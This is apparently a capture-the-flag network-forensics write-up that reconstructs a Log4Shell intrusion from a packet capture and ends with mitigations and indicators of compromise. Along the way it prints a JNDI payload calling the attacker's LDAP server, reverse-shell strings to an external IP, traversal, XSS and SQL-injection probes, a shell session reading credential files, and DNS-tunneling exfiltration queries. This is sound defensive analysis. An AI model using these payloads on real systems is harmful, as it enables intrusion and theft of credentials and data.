# WU-002 — Network Intrusion — PCAP Analysis

| Field | Detail |
|---|---|
| **ID** | WU-002 |
| **Platform** | CTF (Network Forensics challenge) |
| **Category** | Network Forensics / PCAP Analysis |
| **Tools** | Wireshark, tshark, strings, CyberChef, Python |
| **Difficulty** | ⭐⭐⭐ Hard |
| **Date** | 2025 |

---

## 1. Preparation — Setup and Hypothesis

**Objective:** Analyze a network traffic capture (`.pcap`) from a compromised server and reconstruct the event sequence — from initial reconnaissance to data exfiltration.

**Environment:**
```bash
# Verify the received file
file capture.pcap
# capture.pcap: tcpdump capture file (little-endian) - version 2.4 (Ethernet, ...

# Integrity hash
sha256sum capture.pcap > capture.pcap.sha256

# General statistics
capinfos capture.pcap
```

```
File name:           capture.pcap
File type:           Wireshark/tcpdump/... - pcapng
Number of packets:   18,432
File size:           4.2 MB
Start time:          2024-04-14 02:44:11
End time:            2024-04-14 03:22:47
Duration:            38 minutes 36 seconds
```

**Initial hypothesis:** The capture covers a complete incident — reconnaissance, exploitation, and possible exfiltration. The ~38-minute interval is typical of a targeted automated attack.

---

## 2. Identification — Evidence Inventory

### 2.1 Traffic Overview by Protocol

```bash
# Protocol distribution
tshark -r capture.pcap -q -z io,phs
```

```
Frame       18432   100%
├─ Ethernet 18432   100%
│  ├─ IPv4  18401    99.8%
│  │  ├─ TCP 17844   96.8%
│  │  │  ├─ HTTP   4221   22.9%
│  │  │  └─ SSH     892    4.8%
│  │  └─ UDP   557    3.0%
│  │     └─ DNS    543    2.9%
```

→ Traffic is dominated by **HTTP** and **SSH**. DNS volume is higher than expected for a server — possible **DNS tunneling**.

### 2.2 Identify the Hosts Involved

```bash
# Unique IPs and traffic volume
tshark -r capture.pcap -q -z conv,ip | head -20
```

```
IPv4 Conversations
================================================================
                    |       <-      | |       ->      | |     Total     |
                    | Frames  Bytes | | Frames  Bytes | | Frames  Bytes |
192.168.1.105  <->  203.0.113.42   |  1842   2.1MB   |  891   412KB   |  2733   2.5MB
192.168.1.105  <->  185.220.101.47 |   234    89KB   |  421   1.8MB   |   655   1.9MB
192.168.1.105  <->  10.0.0.1       |  4221   8.2MB   |  3891  7.1MB   |  8112  15.3MB
```

**Identified hosts:**
- `192.168.1.105` — internal server (victim)
- `203.0.113.42` — external IP with a large volume of outbound traffic ⚠
- `185.220.101.47` — second external IP, lower volume but suspicious structure
- `10.0.0.1` — internal gateway/router (legitimate traffic)

### 2.3 Initial Timeline

```bash
# First and last packets for the external IP
tshark -r capture.pcap -Y "ip.addr == 203.0.113.42" \
  -T fields -e frame.time | head -3
tshark -r capture.pcap -Y "ip.addr == 203.0.113.42" \
  -T fields -e frame.time | tail -3
```

```
02:44:11 — First packet from 203.0.113.42
02:44:11 to 02:51:33 — Reconnaissance phase (HTTP)
02:51:44 — First suspicious SSH packet from 185.220.101.47
02:51:44 to 03:18:22 — Exploitation/access phase
03:18:22 to 03:22:47 — Exfiltration phase (anomalous DNS)
```

---

## 3. Containment — Detailed Analysis by Phase

### 3.1 Phase 1 — Web Reconnaissance (02:44 – 02:51)

```bash
# Extract all HTTP requests from 203.0.113.42
tshark -r capture.pcap \
  -Y "http.request and ip.src == 203.0.113.42" \
  -T fields -e http.request.method -e http.request.uri | head -30
```

```
GET  /
GET  /robots.txt
GET  /sitemap.xml
GET  /.git/config              ← exposed repository probe
GET  /.env                     ← configuration file probe
GET  /wp-admin/                ← WordPress probe
GET  /phpmyadmin/
GET  /admin/
GET  /login
GET  /api/v1/users
GET  /../../../etc/passwd      ← path traversal attempt
GET  /search?q=<script>alert(1)</script>  ← XSS probe
GET  /search?q=' OR '1'='1    ← SQLi probe
```

**Conclusion:** Typical automated scanner reconnaissance (Nikto/Dirb). The User-Agent confirms it:

```bash
tshark -r capture.pcap -Y "ip.src == 203.0.113.42" \
  -T fields -e http.user_agent | sort -u
# Mozilla/5.0 (compatible; Nikto/2.1.6; ...)
```

→ **Nikto 2.1.6** identified as the scanning tool.

### 3.2 Phase 2 — Exploitation (02:51 – 03:18)

#### 3.2.1 Identify the Successful Attack

```bash
# Check HTTP 200 responses for suspicious requests
tshark -r capture.pcap \
  -Y "http.response.code == 200 and ip.dst == 203.0.113.42" \
  -T fields -e http.request.uri -e http.response.code | head -20
```

```
/search?q=${jndi:ldap://203.0.113.42:1389/exploit}  200
```

→ **Log4Shell (CVE-2021-44228)** — the `/search` endpoint processed the JNDI payload and returned HTTP 200, indicating a Java application with vulnerable Log4j.

#### 3.2.2 Reconstruct the JNDI Payload

```bash
# Filter outbound LDAP traffic after the payload
tshark -r capture.pcap -Y "tcp.port == 1389" \
  -T fields -e frame.time -e ip.src -e ip.dst -e tcp.payload
```

```
02:51:44  192.168.1.105 → 203.0.113.42:1389  [SYN]
02:51:44  203.0.113.42  → 192.168.1.105      [SYN-ACK]
02:51:44  192.168.1.105 → 203.0.113.42:1389  LDAP: searchRequest "exploit"
02:51:45  203.0.113.42  → 192.168.1.105      LDAP: searchResRef (referral to http://203.0.113.42:8888/Exploit.class)
```

#### 3.2.3 Reconstruct the Malicious Class

```bash
# Extract the .class file transferred over HTTP
tshark -r capture.pcap \
  -Y "http and ip.src == 203.0.113.42 and http.response" \
  --export-objects http,./extracted/

ls ./extracted/
# Exploit.class
```

```bash
# Analyze the bytecode
javap -c ./extracted/Exploit.class 2>/dev/null | head -30
strings ./extracted/Exploit.class | grep -E "bash|sh|exec|Runtime|cmd"
```

```
/bin/bash
-i
>&
/dev/tcp/185.220.101.47/4444
0>&1
java.lang.Runtime
exec
```

→ **Reverse shell to `185.220.101.47:4444`** confirmed through the bytecode.

#### 3.2.4 Reconstruct the Reverse Shell Session

```bash
# Inspect TCP traffic to 185.220.101.47:4444
tshark -r capture.pcap \
  -Y "ip.addr == 185.220.101.47 and tcp.port == 4444" \
  -T fields -e frame.time -e tcp.len -e tcp.payload | head -20
```

The TCP payload is plaintext (netcat without TLS):

```bash
# Reconstruct the TCP stream (Wireshark: Follow → TCP Stream)
tshark -r capture.pcap \
  -Y "ip.addr == 185.220.101.47 and tcp.port == 4444" \
  -z follow,tcp,ascii,0 -q
```

```
=== TCP Stream ===
whoami
www-data
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
...
find / -name "*.conf" -readable 2>/dev/null
/etc/mysql/my.cnf
cat /etc/mysql/my.cnf
[client]
user=dbadmin
password=Sup3rS3cr3tDB!
...
```

→ **Database credentials exposed** in plaintext in the reconstructed traffic.

### 3.3 Phase 3 — Exfiltration via DNS Tunneling (03:18 – 03:22)

```bash
# DNS queries with anomalous subdomains
tshark -r capture.pcap -Y "dns.qry.type == 1" \
  -T fields -e frame.time -e dns.qry.name | grep -v "^[a-z0-9-]*\.[a-z]*$"
```

```
03:18:22  aGVsbG8gd29ybGQ=.exfil.203-0-113-42.xyz
03:18:23  cm9vdDp4OjA6MDpyb290.exfil.203-0-113-42.xyz
03:18:24  Oi9yb290Oi9iaW4vYmFzaA==.exfil.203-0-113-42.xyz
...
```

**Base64-encoded subdomains.** Decode them:

```bash
echo "aGVsbG8gd29ybGQ=" | base64 -d
# hello world

echo "cm9vdDp4OjA6MDpyb290" | base64 -d
# root:x:0:0:root

echo "Oi9yb290Oi9iaW4vYmFzaA==" | base64 -d
# :/root:/bin/bash
```

→ The attacker is exfiltrating the contents of `/etc/passwd` **chunk by chunk through DNS queries** — a **DNS tunneling** technique used to bypass firewalls that block direct traffic.

```bash
# Reconstruct the exfiltrated file
tshark -r capture.pcap -Y "dns.qry.type == 1" \
  -T fields -e dns.qry.name \
  | grep "\.exfil\." \
  | awk -F'.' '{print $1}' \
  | while read chunk; do echo "$chunk" | base64 -d 2>/dev/null; done
```

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
mysql:x:112:117:MySQL Server:/nonexistent:/bin/false
dbadmin:x:1001:1001::/home/dbadmin:/bin/bash
```

→ **`/etc/passwd` fully exfiltrated** via DNS tunneling.

---

## 4. Eradication — Root Cause

| # | Event | Timestamp | Technique |
|---|---|---|---|
| 1 | Nikto scan of the web application | 02:44:11 | Active Reconnaissance |
| 2 | Log4Shell payload injected into `/search` | 02:51:44 | CVE-2021-44228 |
| 3 | Server contacts the attacker's LDAP service | 02:51:44 | JNDI Injection |
| 4 | Malicious class downloaded | 02:51:45 | Remote Class Loading |
| 5 | Reverse shell established to :4444 | 02:51:46 | T1059.004 |
| 6 | MySQL credentials discovered | 03:15:00 | Credential Access |
| 7 | `/etc/passwd` exfiltrated via DNS | 03:18:22 | T1048.003 |

**Root cause:** Publicly exposed Java application running vulnerable Log4j 2.x (CVE-2021-44228), without a WAF and without outbound firewall restrictions.

---

## 5. Recovery — Impact

- **Exfiltrated data:** complete `/etc/passwd`, MySQL credentials (`Sup3rS3cr3tDB!`)
- **Access obtained:** shell as `www-data` on the web server
- **Duration:** ~38 minutes of active access
- **C2 channels:** LDAP (:1389), TCP reverse shell (:4444), DNS tunneling

**Immediate actions:**
- Patch Log4j → 2.17.1
- Rotate all database credentials
- Block the IPs `203.0.113.42` and `185.220.101.47`
- Analyze the database server to check for access using the exfiltrated credentials
- Implement egress filtering (block DNS queries to unauthorized external domains)

---

## 6. Lessons Learned

| Vulnerability | Mitigation |
|---|---|
| Outdated Log4j | Patch management + dependency inventory (SBOM) |
| No WAF | WAF with Log4Shell rules |
| No egress filtering on the firewall | Block outbound traffic to unauthorized ports |
| DNS tunneling not detected | DNS filtering + monitoring of anomalous subdomains |
| Credentials in configuration file | Secrets manager (Vault, AWS SSM) |

---

## Tools Used

| Tool | Use |
|---|---|
| `tshark` | CLI analysis of the PCAP, field extraction |
| `capinfos` | General capture statistics |
| `wireshark` | Visual analysis, Follow TCP Stream |
| `javap` | Disassembly of `.class` bytecode |
| `base64` | Decoding DNS payloads |
| `strings` | Binary string extraction |

---

## IoCs

```
Attacker IP 1 : 203.0.113.42      (Nikto scan + LDAP C2 + DNS exfil)
Attacker IP 2 : 185.220.101.47    (Reverse shell C2)
Exfil domain  : *.exfil.203-0-113-42.xyz
C2 ports      : 1389/TCP (LDAP), 4444/TCP (reverse shell), 53/UDP (DNS tunnel)
CVE           : CVE-2021-44228 (Log4Shell)
Tool          : Nikto 2.1.6
```

---

*[← Back to index](../README.md)*
